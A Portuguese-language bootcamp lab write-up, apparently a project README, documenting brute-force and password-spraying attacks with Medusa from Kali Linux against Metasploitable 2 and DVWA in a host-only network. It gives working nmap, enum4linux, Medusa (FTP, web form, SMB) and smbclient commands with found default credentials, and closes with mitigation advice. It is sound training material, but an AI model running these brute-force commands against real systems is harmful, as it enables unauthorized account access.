# 🛡️ Simulando um Ataque de Brute Force com Medusa no Kali Linux

**Projeto Bootcamp DIO - Ethical Hacking / Cybersecurity**

Documentação completa da simulação de ataques de força bruta utilizando a ferramenta **Medusa** em ambiente controlado (Kali Linux + Metasploitable 2 + DVWA).

---

## 🎯 Objetivo do Projeto

Demonstrar na prática os principais tipos de ataques de senhas e como realizar auditoria de força bruta em serviços reais (FTP, formulário web e SMB) utilizando o Medusa.

---

## 📋 Principais Tipos de Ataques

- **Ataque de Dicionário**: Usa uma lista de palavras comuns.
- **Ataque de Força Bruta Pura (Permutação)**: Gera todas as combinações possíveis de caracteres.
- **Ataque Híbrido**: Combina lista de palavras + modificações (Mangling Rules ou Junção de Listas).
- **Password Spraying**: Testa a mesma senha em vários usuários diferentes (ataque silencioso).
- **Credential Stuffing**: Usa credenciais vazadas de outros vazamentos.

---

## 🛠️ Ferramentas do Kali Linux

| Ferramenta | Uso principal                          | Tipo de ataque          |
|------------|----------------------------------------|-------------------------|
| **Medusa** | Brute force em múltiplos protocolos    | Rede (FTP, HTTP, SMB...) |
| Hydra      | Brute force em rede (50+ protocolos)   | Rede                    |
| Ncrack     | Integra com Nmap                       | Rede                    |
| John       | Quebra de senhas **offline**           | Offline                 |
| WPScan     | WordPress                              | Web                     |

---

## 🖥️ Ambiente Utilizado

- **Kali Linux** (atacante)
- **Metasploitable 2** (alvo vulnerável)
- **DVWA** (Damn Vulnerable Web Application)
- Rede: **Host-Only** no VirtualBox

---

## 🔍 Etapas da Auditoria

### 1. Enumeração de Serviços (Nmap)

```bash
nmap -sV -p- 192.168.56.101
```
Resultado principal:

|FTP (21) → vsftpd 2.3.4  |
|SSH (22)                 |
|HTTP (80) → Apache       |
|SMB (445) → Samba        |

### 2. Criação de Wordlists Simples

Usuários
```bash
echo -e "msfadmin\nadmin\nroot" > users.txt
```
Senhas comuns
```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```
### 3. Ataque Brute Force no FTP

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
Resultado:

✅ ACCOUNT FOUND: User: msfadmin | Password: msfadmin

### 4. Ataque Brute Force em Formulário Web (DVWA)

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:"username=USER&password=PASS&Login=Login" \
-m "FAIL=Login failed" -t 6
```
Resultado:

✅ Conta encontrada com usuário e senha da lista.

### 5. Ataque em Cadeia: Enumeração SMB + Password Spraying

```bash
# 1. Enumerar usuários
enum4linux -a 192.168.56.101 | tee enum4_output.txt

# 2. Criar lista de usuários e senhas para spraying
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "123456\npassword\nWelcome123\nmsfadmin" > senhas_spray.txt

# 3. Password Spraying com Medusa
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
Resultado:

✅ ACCOUNT FOUND: User: msfadmin | Password: msfadmin (ADMIN$ - Access Allowed)

### 6. Validação de Acesso

```bash
smbclient -L //192.168.56.101 -U msfadmin
```
Compartilhamentos encontrados:

|print$  | 
|tmp     |
|opt     |
|IPC$    |
|ADMIN$  |
|msfadmin|

🛡️ Recomendações de Mitigação

## 🛡️ Recomendações de Mitigação

| Medida de Mitigação                              | 
|--------------------------------------------------|
| Bloqueio de conta após tentativas falhas         | 
| Política de senhas fortes                        | 
| Ativar 2FA/MFA em todos os serviços              | 
| Rate limiting + CAPTCHA                          | 
| Monitoramento de logs de falhas de login         | 
| Preferir chaves SSH ao invés de senhas           | 
| Manter serviços sempre atualizados               | 
| Uso de UFW + Fail2Ban                            | 




